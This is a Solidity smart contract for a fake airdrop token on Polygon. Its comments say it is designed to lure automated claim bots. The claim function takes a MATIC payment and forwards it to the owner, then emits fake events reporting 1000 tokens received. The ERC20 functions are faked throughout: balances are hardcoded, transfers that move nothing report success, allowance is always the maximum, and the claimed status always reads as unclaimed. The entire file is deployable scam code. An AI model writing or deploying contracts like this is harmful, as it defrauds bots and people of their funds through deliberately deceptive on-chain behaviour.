// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title MockAirdropToken
 * @dev Gas-optimized mock airdrop token contract for Polygon
 * Attractive to automated claim bots with fake ERC20 functions
 */
contract MockAirdropToken {
    // State variables - minimal for gas optimization
    address private owner;
    uint256 private constant MIN_CLAIM_AMOUNT = 0.001 ether; // 0.001 MATIC
    
    // Events to appear legitimate to bots
    event TokensClaimed(address indexed claimer, uint256 amount);
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    // Constructor - sets deployer as owner
    constructor() {
        owner = msg.sender;
    }
    
    /**
     * @dev Payable claim function that requires minimum MATIC payment
     * Transfers all received MATIC to contract owner
     */
    function claim() external payable {
        require(msg.value >= MIN_CLAIM_AMOUNT, "Insufficient payment: minimum 0.001 MATIC required");
        
        // Transfer all received MATIC to owner
        (bool success, ) = payable(owner).call{value: msg.value}("");
        require(success, "Transfer to owner failed");
        
        // Emit fake token claim event with attractive amount
        emit TokensClaimed(msg.sender, 1000 * 10**18); // 1000 tokens
        emit Transfer(address(this), msg.sender, 1000 * 10**18);
    }
    
    /**
     * @dev Fake ERC20 balanceOf function with hardcoded attractive values
     */
    function balanceOf(address account) external pure returns (uint256) {
        // Return different attractive amounts based on address
        if (account == address(0)) return 0;
        return 1000 * 10**18; // Always return 1000 tokens
    }
    
    /**
     * @dev Fake ERC20 totalSupply function
     */
    function totalSupply() external pure returns (uint256) {
        return 1000000 * 10**18; // 1 million total supply
    }
    
    /**
     * @dev Fake ERC20 transfer function - always returns true but doesn't actually transfer
     */
    function transfer(address to, uint256 amount) external returns (bool) {
        // Emit transfer event to appear legitimate
        emit Transfer(msg.sender, to, amount);
        return true; // Always return true to appear successful
    }
    
    /**
     * @dev Fake ERC20 allowance function
     */
    function allowance(address owner_addr, address spender) external pure returns (uint256) {
        // Return max allowance to appear attractive
        return type(uint256).max;
    }
    
    /**
     * @dev Fake ERC20 approve function
     */
    function approve(address spender, uint256 amount) external returns (bool) {
        emit Transfer(msg.sender, spender, 0); // Emit approval-like event
        return true;
    }
    
    /**
     * @dev Standard ERC20 metadata
     */
    function name() external pure returns (string memory) {
        return "Polygon Reward Token";
    }
    
    function symbol() external pure returns (string memory) {
        return "PRT";
    }
    
    function decimals() external pure returns (uint8) {
        return 18;
    }
    
    /**
     * @dev Get contract owner
     */
    function getOwner() external view returns (address) {
        return owner;
    }
    
    /**
     * @dev Get minimum claim amount
     */
    function getMinClaimAmount() external pure returns (uint256) {
        return MIN_CLAIM_AMOUNT;
    }
    
    /**
     * @dev Check if address has already claimed (always returns false to encourage claims)
     */
    function hasClaimed(address account) external pure returns (bool) {
        // Always return false to make it appear everyone can claim
        account; // Silence unused parameter warning
        return false;
    }
    
    /**
     * @dev Get remaining claimable tokens (always returns attractive amount)
     */
    function getRemainingTokens() external pure returns (uint256) {
        return 500000 * 10**18; // Always show 500k tokens remaining
    }
    
    // Fallback function to receive MATIC directly
    receive() external payable {
        (bool success, ) = payable(owner).call{value: msg.value}("");
        require(success, "Transfer failed");
    }
}
